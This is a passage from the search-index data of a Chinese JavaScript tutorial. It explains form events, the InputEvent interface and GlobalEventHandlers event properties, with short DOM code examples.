\u5143\u7d20\uff0c\u56e0\u4e3a\u63d0\u4ea4\u7684\u662f\u8868\u5355\uff0c\u800c\u4e0d\u662f\u6309\u94ae\u3002 InputEvent \u63a5\u53e3 \u00b6 InputEvent \u63a5\u53e3\u4e3b\u8981\u7528\u6765\u63cf\u8ff0 input \u4e8b\u4ef6\u7684\u5b9e\u4f8b\u3002\u8be5\u63a5\u53e3\u7ee7\u627f\u4e86 Event \u63a5\u53e3\uff0c\u8fd8\u5b9a\u4e49\u4e86\u4e00\u4e9b\u81ea\u5df1\u7684\u5b9e\u4f8b\u5c5e\u6027\u548c\u5b9e\u4f8b\u65b9\u6cd5\u3002 \u6d4f\u89c8\u5668\u539f\u751f\u63d0\u4f9b InputEvent() \u6784\u9020\u51fd\u6570\uff0c\u7528\u6765\u751f\u6210\u5b9e\u4f8b\u5bf9\u8c61\u3002 1 new InputEvent ( type , options ) InputEvent \u6784\u9020\u51fd\u6570\u53ef\u4ee5\u63a5\u53d7\u4e24\u4e2a\u53c2\u6570\u3002\u7b2c\u4e00\u4e2a\u53c2\u6570\u662f\u5b57\u7b26\u4e32\uff0c\u8868\u793a\u4e8b\u4ef6\u540d\u79f0\uff0c\u8be5\u53c2\u6570\u662f\u5fc5\u9700\u7684\u3002\u7b2c\u4e8c\u4e2a\u53c2\u6570\u662f\u4e00\u4e2a\u914d\u7f6e\u5bf9\u8c61\uff0c\u7528\u6765\u8bbe\u7f6e\u4e8b\u4ef6\u5b9e\u4f8b\u7684\u5c5e\u6027\uff0c\u8be5\u53c2\u6570\u662f\u53ef\u9009\u7684\u3002\u914d\u7f6e\u5bf9\u8c61\u7684\u5b57\u6bb5\u9664\u4e86 Event \u6784\u9020\u51fd\u6570\u7684\u914d\u7f6e\u5c5e\u6027\uff0c\u8fd8\u53ef\u4ee5\u8bbe\u7f6e\u4e0b\u9762\u7684\u5b57\u6bb5\uff0c\u8fd9\u4e9b\u5b57\u6bb5\u90fd\u662f\u53ef\u9009\u7684\u3002 inputType \uff1a\u5b57\u7b26\u4e32\uff0c\u8868\u793a\u53d1\u751f\u53d8\u66f4\u7684\u7c7b\u578b\uff08\u8be6\u89c1\u4e0b\u6587\uff09\u3002 data \uff1a\u5b57\u7b26\u4e32\uff0c\u8868\u793a\u63d2\u5165\u7684\u5b57\u7b26\u4e32\u3002\u5982\u679c\u6ca1\u6709\u63d2\u5165\u7684\u5b57\u7b26\u4e32\uff08\u6bd4\u5982\u5220\u9664\u64cd\u4f5c\uff09\uff0c\u5219\u8fd4\u56de null \u6216\u7a7a\u5b57\u7b26\u4e32\u3002 dataTransfer \uff1a\u8fd4\u56de\u4e00\u4e2a DataTransfer \u5bf9\u8c61\u5b9e\u4f8b\uff0c\u8be5\u5c5e\u6027\u901a\u5e38\u53ea\u5728\u8f93\u5165\u6846\u63a5\u53d7\u5bcc\u6587\u672c\u8f93\u5165\u65f6\u6709\u6548\u3002 InputEvent \u7684\u5b9e\u4f8b\u5c5e\u6027\u4e3b\u8981\u5c31\u662f\u4e0a\u9762\u4e09\u4e2a\u5c5e\u6027\uff0c\u8fd9\u4e09\u4e2a\u5b9e\u4f8b\u5c5e\u6027\u90fd\u662f\u53ea\u8bfb\u7684\u3002 \uff081\uff09InputEvent.data InputEvent.data \u5c5e\u6027\u8fd4\u56de\u4e00\u4e2a\u5b57\u7b26\u4e32\uff0c\u8868\u793a\u53d8\u52a8\u7684\u5185\u5bb9\u3002 1 2 3 4 5 6 7 8 // HTML \u4ee3\u7801\u5982\u4e0b // <input type=\"text\" id=\"myInput\"> var input = document . getElementById ( 'myInput' ); input . addEventListener ( 'input' , myFunction , false ); function myFunction ( e ) { console . log ( e . data ); } \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u5982\u679c\u624b\u52a8\u5728\u8f93\u5165\u6846\u91cc\u9762\u8f93\u5165 abc \uff0c\u63a7\u5236\u53f0\u4f1a\u5148\u8f93\u51fa a \uff0c\u518d\u5728\u4e0b\u4e00\u884c\u8f93\u51fa b \uff0c\u518d\u5728\u4e0b\u4e00\u884c\u8f93\u51fa c \u3002\u7136\u540e\u9009\u4e2d abc \uff0c\u4e00\u6b21\u6027\u5c06\u5b83\u4eec\u5220\u9664\uff0c\u63a7\u5236\u53f0\u4f1a\u8f93\u51fa null \u6216\u4e00\u4e2a\u7a7a\u5b57\u7b26\u4e32\u3002 \uff082\uff09InputEvent.inputType InputEvent.inputType \u5c5e\u6027\u8fd4\u56de\u4e00\u4e2a\u5b57\u7b26\u4e32\uff0c\u8868\u793a\u5b57\u7b26\u4e32\u53d1\u751f\u53d8\u66f4\u7684\u7c7b\u578b\u3002 \u5bf9\u4e8e\u5e38\u89c1\u60c5\u51b5\uff0cChrome \u6d4f\u89c8\u5668\u7684\u8fd4\u56de\u503c\u5982\u4e0b\u3002\u5b8c\u6574\u5217\u8868\u53ef\u4ee5\u53c2\u8003 \u6587\u6863 \u3002 \u624b\u52a8\u63d2\u5165\u6587\u672c\uff1a insertText \u7c98\u8d34\u63d2\u5165\u6587\u672c\uff1a insertFromPaste \u5411\u540e\u5220\u9664\uff1a deleteContentBackward \u5411\u524d\u5220\u9664\uff1a deleteContentForward \uff083\uff09InputEvent.dataTransfer InputEvent.dataTransfer \u5c5e\u6027\u8fd4\u56de\u4e00\u4e2a DataTransfer \u5b9e\u4f8b\u3002\u8be5\u5c5e\u6027\u53ea\u5728\u6587\u672c\u6846\u63a5\u53d7\u7c98\u8d34\u5185\u5bb9\uff08insertFromPaste\uff09\u6216\u62d6\u62fd\u5185\u5bb9\uff08 insertFromDrop \uff09\u65f6\u624d\u6709\u6548\u3002","title":"\u8868\u5355\u4e8b\u4ef6"},{"location":"events/form/#_1","text":"","title":"\u8868\u5355\u4e8b\u4ef6"},{"location":"events/form/#_2","text":"","title":"\u8868\u5355\u4e8b\u4ef6\u7684\u79cd\u7c7b"},{"location":"events/form/#input","text":"input \u4e8b\u4ef6\u5f53 <input> \u3001 <select> \u3001 <textarea> \u7684\u503c\u53d1\u751f\u53d8\u5316\u65f6\u89e6\u53d1\u3002\u5bf9\u4e8e\u590d\u9009\u6846\uff08 <input type=checkbox> \uff09\u6216\u5355\u9009\u6846\uff08 <input type=radio> \uff09\uff0c\u7528\u6237\u6539\u53d8\u9009\u9879\u65f6\uff0c\u4e5f\u4f1a\u89e6\u53d1\u8fd9\u4e2a\u4e8b\u4ef6\u3002\u53e6\u5916\uff0c\u5bf9\u4e8e\u6253\u5f00 contenteditable \u5c5e\u6027\u7684\u5143\u7d20\uff0c\u53ea\u8981\u503c\u53d1\u751f\u53d8\u5316\uff0c\u4e5f\u4f1a\u89e6\u53d1 input \u4e8b\u4ef6\u3002 input \u4e8b\u4ef6\u7684\u4e00\u4e2a\u7279\u70b9\uff0c\u5c31\u662f\u4f1a\u8fde\u7eed\u89e6\u53d1\uff0c\u6bd4\u5982\u7528\u6237\u6bcf\u6309\u4e0b\u4e00\u6b21\u6309\u952e\uff0c\u5c31\u4f1a\u89e6\u53d1\u4e00\u6b21 input \u4e8b\u4ef6\u3002 input \u4e8b\u4ef6\u5bf9\u8c61\u7ee7\u627f\u4e86 InputEvent \u63a5\u53e3\u3002 \u8be5\u4e8b\u4ef6\u8ddf change \u4e8b\u4ef6\u5f88\u50cf\uff0c\u4e0d\u540c\u4e4b\u5904\u5728\u4e8e input \u4e8b\u4ef6\u5728\u5143\u7d20\u7684\u503c\u53d1\u751f\u53d8\u5316\u540e\u7acb\u5373\u53d1\u751f\uff0c\u800c change \u5728\u5143\u7d20\u5931\u53bb\u7126\u70b9\u65f6\u53d1\u751f\uff0c\u800c\u5185\u5bb9\u6b64\u65f6\u53ef\u80fd\u5df2\u7ecf\u53d8\u5316\u591a\u6b21\u3002\u4e5f\u5c31\u662f\u8bf4\uff0c\u5982\u679c\u6709\u8fde\u7eed\u53d8\u5316\uff0c input \u4e8b\u4ef6\u4f1a\u89e6\u53d1\u591a\u6b21\uff0c\u800c change \u4e8b\u4ef6\u53ea\u5728\u5931\u53bb\u7126\u70b9\u65f6\u89e6\u53d1\u4e00\u6b21\u3002 \u4e0b\u9762\u662f <select> \u5143\u7d20\u7684\u4f8b\u5b50\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 14 /* HTML \u4ee3\u7801\u5982\u4e0b <select id=\"mySelect\"> <option value=\"1\">1</option> <option value=\"2\">2</option> <option value=\"3\">3</option> </select> */ function inputHandler ( e ) { console . log ( e . target . value ) } var mySelect = document . querySelector ( '#mySelect' ); mySelect . addEventListener ( 'input' , inputHandler ); \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u6539\u53d8\u4e0b\u62c9\u6846\u9009\u9879\u65f6\uff0c\u4f1a\u89e6\u53d1 input \u4e8b\u4ef6\uff0c\u4ece\u800c\u6267\u884c\u56de\u8c03\u51fd\u6570 inputHandler \u3002","title":"input \u4e8b\u4ef6"},{"location":"events/form/#select","text":"select \u4e8b\u4ef6\u5f53\u5728 <input> \u3001 <textarea> \u91cc\u9762\u9009\u4e2d\u6587\u672c\u65f6\u89e6\u53d1\u3002 1 2 3 4 5 6 7 // HTML \u4ee3\u7801\u5982\u4e0b // <input id=\"test\" type=\"text\" value=\"Select me!\" /> var elem = document . getElementById ( 'test' ); elem . addEventListener ( 'select' , function ( e ) { console . log ( e . type ); // \"select\" }, false ); \u9009\u4e2d\u7684\u6587\u672c\u53ef\u4ee5\u901a\u8fc7 event.target \u5143\u7d20\u7684 selectionDirection \u3001 selectionEnd \u3001 selectionStart \u548c value \u5c5e\u6027\u62ff\u5230\u3002","title":"select \u4e8b\u4ef6"},{"location":"events/form/#change","text":"change \u4e8b\u4ef6\u5f53 <input> \u3001 <select> \u3001 <textarea> \u7684\u503c\u53d1\u751f\u53d8\u5316\u65f6\u89e6\u53d1\u3002\u5b83\u4e0e input \u4e8b\u4ef6\u7684\u6700\u5927\u4e0d\u540c\uff0c\u5c31\u662f\u4e0d\u4f1a\u8fde\u7eed\u89e6\u53d1\uff0c\u53ea\u6709\u5f53\u5168\u90e8\u4fee\u6539\u5b8c\u6210\u65f6\u624d\u4f1a\u89e6\u53d1\uff0c\u53e6\u4e00\u65b9\u9762 input \u4e8b\u4ef6\u5fc5\u7136\u4f34\u968f change \u4e8b\u4ef6\u3002\u5177\u4f53\u6765\u8bf4\uff0c\u5206\u6210\u4ee5\u4e0b\u51e0\u79cd\u60c5\u51b5\u3002 \u6fc0\u6d3b\u5355\u9009\u6846\uff08radio\uff09\u6216\u590d\u9009\u6846\uff08checkbox\uff09\u65f6\u89e6\u53d1\u3002 \u7528\u6237\u63d0\u4ea4\u65f6\u89e6\u53d1\u3002\u6bd4\u5982\uff0c\u4ece\u4e0b\u5217\u5217\u8868\uff08select\uff09\u5b8c\u6210\u9009\u62e9\uff0c\u5728\u65e5\u671f\u6216\u6587\u4ef6\u8f93\u5165\u6846\u5b8c\u6210\u9009\u62e9\u3002 \u5f53\u6587\u672c\u6846\u6216 <textarea> \u5143\u7d20\u7684\u503c\u53d1\u751f\u6539\u53d8\uff0c\u5e76\u4e14\u4e27\u5931\u7126\u70b9\u65f6\u89e6\u53d1\u3002 \u4e0b\u9762\u662f\u4e00\u4e2a\u4f8b\u5b50\u3002 1 2 3 4 5 6 7 8 9 10 // HTML \u4ee3\u7801\u5982\u4e0b // <select size=\"1\" onchange=\"changeEventHandler(event);\"> // <option>chocolate</option> // <option>strawberry</option> // <option>vanilla</option> // </select> function changeEventHandler ( event ) { console . log ( event . target . value ); } \u5982\u679c\u6bd4\u8f83\u4e00\u4e0b\u4e0a\u9762 input \u4e8b\u4ef6\u7684\u4f8b\u5b50\uff0c\u4f60\u4f1a\u53d1\u73b0\u5bf9\u4e8e <select> \u5143\u7d20\u6765\u8bf4\uff0c input \u548c change \u4e8b\u4ef6\u57fa\u672c\u662f\u7b49\u4ef7\u7684\u3002","title":"change \u4e8b\u4ef6"},{"location":"events/form/#invalid","text":"\u7528\u6237\u63d0\u4ea4\u8868\u5355\u65f6\uff0c\u5982\u679c\u8868\u5355\u5143\u7d20\u7684\u503c\u4e0d\u6ee1\u8db3\u6821\u9a8c\u6761\u4ef6\uff0c\u5c31\u4f1a\u89e6\u53d1 invalid \u4e8b\u4ef6\u3002 1 2 3 4 < form > < input type = \"text\" required oninvalid = \"console.log('invalid input')\" /> < button type = \"submit\" > \u63d0\u4ea4 </ button > </ form > \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u8f93\u5165\u6846\u662f\u5fc5\u586b\u7684\u3002\u5982\u679c\u4e0d\u586b\uff0c\u7528\u6237\u70b9\u51fb\u6309\u94ae\u63d0\u4ea4\u65f6\uff0c\u5c31\u4f1a\u89e6\u53d1\u8f93\u5165\u6846\u7684 invalid \u4e8b\u4ef6\uff0c\u5bfc\u81f4\u63d0\u4ea4\u88ab\u53d6\u6d88\u3002","title":"invalid \u4e8b\u4ef6"},{"location":"events/form/#reset-submit","text":"\u8fd9\u4e24\u4e2a\u4e8b\u4ef6\u53d1\u751f\u5728\u8868\u5355\u5bf9\u8c61 <form> \u4e0a\uff0c\u800c\u4e0d\u662f\u53d1\u751f\u5728\u8868\u5355\u7684\u6210\u5458\u4e0a\u3002 reset \u4e8b\u4ef6\u5f53\u8868\u5355\u91cd\u7f6e\uff08\u6240\u6709\u8868\u5355\u6210\u5458\u53d8\u56de\u9ed8\u8ba4\u503c\uff09\u65f6\u89e6\u53d1\u3002 submit \u4e8b\u4ef6\u5f53\u8868\u5355\u6570\u636e\u5411\u670d\u52a1\u5668\u63d0\u4ea4\u65f6\u89e6\u53d1\u3002\u6ce8\u610f\uff0c submit \u4e8b\u4ef6\u7684\u53d1\u751f\u5bf9\u8c61\u662f <form> \u5143\u7d20\uff0c\u800c\u4e0d\u662f <button> \u5143\u7d20\uff0c\u56e0\u4e3a\u63d0\u4ea4\u7684\u662f\u8868\u5355\uff0c\u800c\u4e0d\u662f\u6309\u94ae\u3002","title":"reset \u4e8b\u4ef6\uff0csubmit \u4e8b\u4ef6"},{"location":"events/form/#inputevent","text":"InputEvent \u63a5\u53e3\u4e3b\u8981\u7528\u6765\u63cf\u8ff0 input \u4e8b\u4ef6\u7684\u5b9e\u4f8b\u3002\u8be5\u63a5\u53e3\u7ee7\u627f\u4e86 Event \u63a5\u53e3\uff0c\u8fd8\u5b9a\u4e49\u4e86\u4e00\u4e9b\u81ea\u5df1\u7684\u5b9e\u4f8b\u5c5e\u6027\u548c\u5b9e\u4f8b\u65b9\u6cd5\u3002 \u6d4f\u89c8\u5668\u539f\u751f\u63d0\u4f9b InputEvent() \u6784\u9020\u51fd\u6570\uff0c\u7528\u6765\u751f\u6210\u5b9e\u4f8b\u5bf9\u8c61\u3002 1 new InputEvent ( type , options ) InputEvent \u6784\u9020\u51fd\u6570\u53ef\u4ee5\u63a5\u53d7\u4e24\u4e2a\u53c2\u6570\u3002\u7b2c\u4e00\u4e2a\u53c2\u6570\u662f\u5b57\u7b26\u4e32\uff0c\u8868\u793a\u4e8b\u4ef6\u540d\u79f0\uff0c\u8be5\u53c2\u6570\u662f\u5fc5\u9700\u7684\u3002\u7b2c\u4e8c\u4e2a\u53c2\u6570\u662f\u4e00\u4e2a\u914d\u7f6e\u5bf9\u8c61\uff0c\u7528\u6765\u8bbe\u7f6e\u4e8b\u4ef6\u5b9e\u4f8b\u7684\u5c5e\u6027\uff0c\u8be5\u53c2\u6570\u662f\u53ef\u9009\u7684\u3002\u914d\u7f6e\u5bf9\u8c61\u7684\u5b57\u6bb5\u9664\u4e86 Event \u6784\u9020\u51fd\u6570\u7684\u914d\u7f6e\u5c5e\u6027\uff0c\u8fd8\u53ef\u4ee5\u8bbe\u7f6e\u4e0b\u9762\u7684\u5b57\u6bb5\uff0c\u8fd9\u4e9b\u5b57\u6bb5\u90fd\u662f\u53ef\u9009\u7684\u3002 inputType \uff1a\u5b57\u7b26\u4e32\uff0c\u8868\u793a\u53d1\u751f\u53d8\u66f4\u7684\u7c7b\u578b\uff08\u8be6\u89c1\u4e0b\u6587\uff09\u3002 data \uff1a\u5b57\u7b26\u4e32\uff0c\u8868\u793a\u63d2\u5165\u7684\u5b57\u7b26\u4e32\u3002\u5982\u679c\u6ca1\u6709\u63d2\u5165\u7684\u5b57\u7b26\u4e32\uff08\u6bd4\u5982\u5220\u9664\u64cd\u4f5c\uff09\uff0c\u5219\u8fd4\u56de null \u6216\u7a7a\u5b57\u7b26\u4e32\u3002 dataTransfer \uff1a\u8fd4\u56de\u4e00\u4e2a DataTransfer \u5bf9\u8c61\u5b9e\u4f8b\uff0c\u8be5\u5c5e\u6027\u901a\u5e38\u53ea\u5728\u8f93\u5165\u6846\u63a5\u53d7\u5bcc\u6587\u672c\u8f93\u5165\u65f6\u6709\u6548\u3002 InputEvent \u7684\u5b9e\u4f8b\u5c5e\u6027\u4e3b\u8981\u5c31\u662f\u4e0a\u9762\u4e09\u4e2a\u5c5e\u6027\uff0c\u8fd9\u4e09\u4e2a\u5b9e\u4f8b\u5c5e\u6027\u90fd\u662f\u53ea\u8bfb\u7684\u3002 \uff081\uff09InputEvent.data InputEvent.data \u5c5e\u6027\u8fd4\u56de\u4e00\u4e2a\u5b57\u7b26\u4e32\uff0c\u8868\u793a\u53d8\u52a8\u7684\u5185\u5bb9\u3002 1 2 3 4 5 6 7 8 // HTML \u4ee3\u7801\u5982\u4e0b // <input type=\"text\" id=\"myInput\"> var input = document . getElementById ( 'myInput' ); input . addEventListener ( 'input' , myFunction , false ); function myFunction ( e ) { console . log ( e . data ); } \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u5982\u679c\u624b\u52a8\u5728\u8f93\u5165\u6846\u91cc\u9762\u8f93\u5165 abc \uff0c\u63a7\u5236\u53f0\u4f1a\u5148\u8f93\u51fa a \uff0c\u518d\u5728\u4e0b\u4e00\u884c\u8f93\u51fa b \uff0c\u518d\u5728\u4e0b\u4e00\u884c\u8f93\u51fa c \u3002\u7136\u540e\u9009\u4e2d abc \uff0c\u4e00\u6b21\u6027\u5c06\u5b83\u4eec\u5220\u9664\uff0c\u63a7\u5236\u53f0\u4f1a\u8f93\u51fa null \u6216\u4e00\u4e2a\u7a7a\u5b57\u7b26\u4e32\u3002 \uff082\uff09InputEvent.inputType InputEvent.inputType \u5c5e\u6027\u8fd4\u56de\u4e00\u4e2a\u5b57\u7b26\u4e32\uff0c\u8868\u793a\u5b57\u7b26\u4e32\u53d1\u751f\u53d8\u66f4\u7684\u7c7b\u578b\u3002 \u5bf9\u4e8e\u5e38\u89c1\u60c5\u51b5\uff0cChrome \u6d4f\u89c8\u5668\u7684\u8fd4\u56de\u503c\u5982\u4e0b\u3002\u5b8c\u6574\u5217\u8868\u53ef\u4ee5\u53c2\u8003 \u6587\u6863 \u3002 \u624b\u52a8\u63d2\u5165\u6587\u672c\uff1a insertText \u7c98\u8d34\u63d2\u5165\u6587\u672c\uff1a insertFromPaste \u5411\u540e\u5220\u9664\uff1a deleteContentBackward \u5411\u524d\u5220\u9664\uff1a deleteContentForward \uff083\uff09InputEvent.dataTransfer InputEvent.dataTransfer \u5c5e\u6027\u8fd4\u56de\u4e00\u4e2a DataTransfer \u5b9e\u4f8b\u3002\u8be5\u5c5e\u6027\u53ea\u5728\u6587\u672c\u6846\u63a5\u53d7\u7c98\u8d34\u5185\u5bb9\uff08insertFromPaste\uff09\u6216\u62d6\u62fd\u5185\u5bb9\uff08 insertFromDrop \uff09\u65f6\u624d\u6709\u6548\u3002","title":"InputEvent \u63a5\u53e3"},{"location":"events/globaleventhandlers/","text":"GlobalEventHandlers \u63a5\u53e3 \u00b6 \u6307\u5b9a\u4e8b\u4ef6\u7684\u56de\u8c03\u51fd\u6570\uff0c\u63a8\u8350\u4f7f\u7528\u7684\u65b9\u6cd5\u662f\u5143\u7d20\u7684 addEventListener \u65b9\u6cd5\u3002 1 div . addEventListener ( 'click' , clickHandler , false ); \u9664\u4e86\u4e4b\u5916\uff0c\u8fd8\u6709\u4e00\u79cd\u65b9\u6cd5\u53ef\u4ee5\u76f4\u63a5\u6307\u5b9a\u4e8b\u4ef6\u7684\u56de\u8c03\u51fd\u6570\u3002 1 div . onclick = clickHandler ; \u8fd9\u4e2a\u63a5\u53e3\u662f\u7531 GlobalEventHandlers \u63a5\u53e3\u63d0\u4f9b\u7684\u3002\u5b83\u7684\u4f18\u70b9\u662f\u4f7f\u7528\u6bd4\u8f83\u65b9\u4fbf\uff0c\u7f3a\u70b9\u662f\u53ea\u80fd\u4e3a\u6bcf\u4e2a\u4e8b\u4ef6\u6307\u5b9a\u4e00\u4e2a\u56de\u8c03\u51fd\u6570\uff0c\u5e76\u4e14\u65e0\u6cd5\u6307\u5b9a\u4e8b\u4ef6\u89e6\u53d1\u7684\u9636\u6bb5\uff08\u6355\u83b7\u9636\u6bb5\u8fd8\u662f\u5192\u6ce1\u9636\u6bb5\uff09\u3002 HTMLElement \u3001 Document \u548c Window \u90fd\u7ee7\u627f\u4e86\u8fd9\u4e2a\u63a5\u53e3\uff0c\u4e5f\u5c31\u662f\u8bf4\uff0c\u5404\u79cd HTML \u5143\u7d20\u3001 document \u5bf9\u8c61\u3001 window \u5bf9\u8c61\u4e0a\u9762\u90fd\u53ef\u4ee5\u4f7f\u7528 GlobalEventHandlers \u63a5\u53e3\u63d0\u4f9b\u7684\u5c5e\u6027\u3002\u4e0b\u9762\u5c31\u5217\u51fa\u8fd9\u4e2a\u63a5\u53e3\u63d0\u4f9b\u7684\u4e3b\u8981\u7684\u4e8b\u4ef6\u5c5e\u6027\u3002 GlobalEventHandlers.onabort \u00b6 \u67d0\u4e2a\u5bf9\u8c61\u7684 abort \u4e8b\u4ef6\uff08\u505c\u6b62\u52a0\u8f7d\uff09\u53d1\u751f\u65f6\uff0c\u5c31\u4f1a\u8c03\u7528 onabort \u5c5e\u6027\u6307\u5b9a\u7684\u56de\u8c03\u51fd\u6570\u3002 \u5404\u79cd\u5143\u7d20\u7684\u505c\u6b62\u52a0\u8f7d\u4e8b\u4ef6\uff0c\u5230\u5e95\u5982\u4f55\u89e6\u53d1\uff0c\u76ee\u524d\u5e76\u6ca1\u6709\u7edf\u4e00\u7684\u89c4\u5b9a\u3002\u56e0\u6b64\u5b9e\u9645\u4e0a\uff0c\u8fd9\u4e2a\u5c5e\u6027\u73b0\u5728\u4e00\u822c\u53ea\u7528\u5728 <img> \u5143\u7d20\u4e0a\u9762\u3002 1 2 3 4 5 6 // HTML \u4ee3\u7801\u5982\u4e0b // <img src=\"example.jpg\" id=\"img\"> var img = document . getElementById ( 'img' ); img . onabort = function () { console . log ( 'image load aborted.' ); } GlobalEventHandlers.onerror \u00b6 error \u4e8b\u4ef6\u53d1\u751f\u65f6\uff0c\u5c31\u4f1a\u8c03\u7528 onerror \u5c5e\u6027\u6307\u5b9a\u7684\u56de\u8c03\u51fd\u6570\u3002 error \u4e8b\u4ef6\u5206\u6210\u4e24\u79cd\u3002 \u4e00\u79cd\u662f JavaScript \u7684\u8fd0\u884c\u65f6\u9519\u8bef\uff0c\u8fd9\u4f1a\u4f20\u5230 window \u5bf9\u8c61\uff0c\u5bfc\u81f4 window.onerror() \u3002 1 2 3 window . onerror = function ( message , source , lineno , colno , error ) { // ... } window.onerror \u7684\u5904\u7406\u51fd\u6570\u5171\u63a5\u53d7\u4e94\u4e2a\u53c2\u6570\uff0c\u542b\u4e49\u5982\u4e0b\u3002 message\uff1a\u9519\u8bef\u4fe1\u606f\u5b57\u7b26\u4e32 source\uff1a\u62a5\u9519\u811a\u672c\u7684 URL lineno\uff1a\u62a5\u9519\u7684\u884c\u53f7\uff0c\u662f\u4e00\u4e2a\u6574\u6570 colno\uff1a\u62a5\u9519\u7684\u5217\u53f7\uff0c\u662f\u4e00\u4e2a\u6574\u6570 error\uff1a \u9519\u8bef\u5bf9\u8c61 \u53e6\u4e00\u79cd\u662f\u8d44\u6e90\u52a0\u8f7d\u9519\u8bef\uff0c\u6bd4\u5982 <img> \u6216 <script> \u52a0\u8f7d\u7684\u8d44\u6e90\u51fa\u73b0\u52a0\u8f7d\u9519\u8bef\u3002\u8fd9\u65f6\uff0cError \u5bf9\u8c61\u4f1a\u4f20\u5230\u5bf9\u5e94\u7684\u5143\u7d20\uff0c\u5bfc\u81f4\u8be5\u5143\u7d20\u7684 onerror \u5c5e\u6027\u5f00\u59cb\u6267\u884c\u3002 1 2 3 element . onerror = function ( event ) { // ... } \u6ce8\u610f\uff0c\u4e00\u822c\u6765\u8bf4\uff0c\u8d44\u6e90\u7684\u52a0\u8f7d\u9519\u8bef\u4e0d\u4f1a\u89e6\u53d1 window.onerror \u3002 GlobalEventHandlers.onload\u3001GlobalEventHandlers.onloadstart \u00b6 \u5143\u7d20\u5b8c\u6210\u52a0\u8f7d\u65f6\uff0c\u4f1a\u89e6\u53d1 load \u4e8b\u4ef6\uff0c\u6267\u884c onload() \u3002\u5b83\u7684\u5178\u578b\u4f7f\u7528\u573a\u666f\u662f window \u5bf9\u8c61\u548c <img> \u5143\u7d20\u3002\u5bf9\u4e8e window \u5bf9\u8c61\u6765\u8bf4\uff0c\u53ea\u6709\u9875\u9762\u7684\u6240\u6709\u8d44\u6e90\u52a0\u8f7d\u5b8c\u6210\uff08\u5305\u62ec\u56fe\u7247\u3001\u811a\u672c\u3001\u6837\u5f0f\u8868\u3001\u5b57\u4f53\u7b49\u6240\u6709\u5916\u90e8\u8d44\u6e90\uff09\uff0c\u624d\u4f1a\u89e6\u53d1 load \u4e8b\u4ef6\u3002 \u5bf9\u4e8e <img> \u548c <video> \u7b49\u5143\u7d20\uff0c\u52a0\u8f7d\u5f00\u59cb\u65f6\u8fd8\u4f1a\u89e6\u53d1 loadstart \u4e8b\u4ef6\uff0c\u5bfc\u81f4\u6267\u884c onloadstart \u3002 GlobalEventHandlers.onfocus\uff0cGlobalEventHandlers.onblur \u00b6 \u5f53\u524d\u5143\u7d20\u83b7\u5f97\u7126\u70b9\u65f6\uff0c\u4f1a\u89e6\u53d1 element.onfocus \uff1b\u5931\u53bb\u7126\u70b9\u65f6\uff0c\u4f1a\u89e6\u53d1 element.onblur \u3002 1 2 3 4 5 6 element . onfocus = function () { console . log ( \"onfocus event detected!\" ); }; element . onblur = function () { console . log ( \"onblur event detected!\" ); }; \u6ce8\u610f\uff0c\u5982\u679c\u4e0d\u662f\u53ef\u4ee5\u63a5\u53d7\u7528\u6237\u8f93\u5165\u7684\u5143\u7d20\uff0c\u8981\u89e6\u53d1 onfocus \uff0c\u8be5\u5143\u7d20\u5fc5\u987b\u6709 tabindex \u5c5e\u6027\u3002 GlobalEventHandlers.onscroll \u00b6 \u9875\u9762\u6216\u5143\u7d20\u6eda\u52a8\u65f6\uff0c\u4f1a\u89e6\u53d1 scroll \u4e8b\u4ef6\uff0c\u5bfc\u81f4\u6267\u884c onscroll() \u3002 GlobalEventHandlers.oncontextmenu\uff0cGlobalEventHandlers.onshow \u00b6 \u7528\u6237\u5728\u9875\u9762\u4e0a\u6309\u4e0b\u9f20\u6807\u7684\u53f3\u952e\uff0c\u4f1a\u89e6\u53d1 contextmenu \u4e8b\u4ef6\uff0c\u5bfc\u81f4\u6267\u884c oncontextmenu() \u3002\u5982\u679c\u8be5\u5c5e\u6027\u6267\u884c\u540e\u8fd4\u56de false \uff0c\u5c31\u7b49\u4e8e\u7981\u6b62\u4e86\u53f3\u952e\u83dc\u5355\u3002 document.oncontextmenu \u4e0e window.oncontextmenu \u6548\u679c\u4e00\u6837\u3002 1 2 3 document . oncontextmenu = function () { return false ; }; \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c oncontextmenu \u5c5e\u6027\u6267\u884c\u540e\u8fd4\u56de false \uff0c\u53f3\u952e\u83dc\u5355\u5c31\u4e0d\u4f1a\u51fa\u73b0\u3002 \u5143\u7d20\u7684\u53f3\u952e\u83dc\u5355\u663e\u793a\u65f6\uff0c\u4f1a\u89e6\u53d1\u8be5\u5143\u7d20\u7684 onshow \u76d1\u542c\u51fd\u6570\u3002 \u5176\u4ed6\u7684\u4e8b\u4ef6\u5c5e\u6027 \u00b6 \u9f20\u6807\u7684\u4e8b\u4ef6\u5c5e\u6027\u3002 onclick ondblclick onmousedown onmouseenter onmouseleave onmousemove onmouseout onmouseover onmouseup onwheel \u952e\u76d8\u7684\u4e8b\u4ef6\u5c5e\u6027\u3002 onkeydown onkeypress onkeyup \u7126\u70b9\u7684\u4e8b\u4ef6\u5c5e\u6027\u3002 onblur onfocus \u8868\u5355\u7684\u4e8b\u4ef6\u5c5e\u6027\u3002 oninput onchange onsubmit onreset oninvalid onselect \u89e6\u6478\u7684\u4e8b\u4ef6\u5c5e\u6027\u3002 ontouchcancel ontouchend ontouchmove ontouchstart \u62d6\u52a8\u7684\u4e8b\u4ef6\u5c5e\u6027\u5206\u6210\u4e24\u7c7b\uff1a\u4e00\u7c7b\u4e0e\u88ab\u62d6\u52a8\u5143\u7d20\u76f8\u5173\uff0c\u53e6\u4e00\u7c7b\u4e0e\u63a5\u6536\u88ab\u62d6\u52a8\u5143\u7d20\u7684\u5bb9\u5668\u5143\u7d20\u76f8\u5173\u3002 \u88ab\u62d6\u52a8\u5143\u7d20\u7684\u4e8b\u4ef6\u5c5e\u6027\u3002 ondragstart\uff1a\u62d6\u52a8\u5f00\u59cb ondrag\uff1a\u62d6\u52a8\u8fc7\u7a0b\u4e2d\uff0c\u6bcf\u9694\u51e0\u767e\u6beb\u79d2\u89e6\u53d1\u4e00\u6b21 ondragend\uff1a\u62d6\u52a8\u7ed3\u675f \u63a5\u6536\u88ab\u62d6\u52a8\u5143\u7d20\u7684\u5bb9\u5668\u5143\u7d20\u7684\u4e8b\u4ef6\u5c5e\u6027\u3002 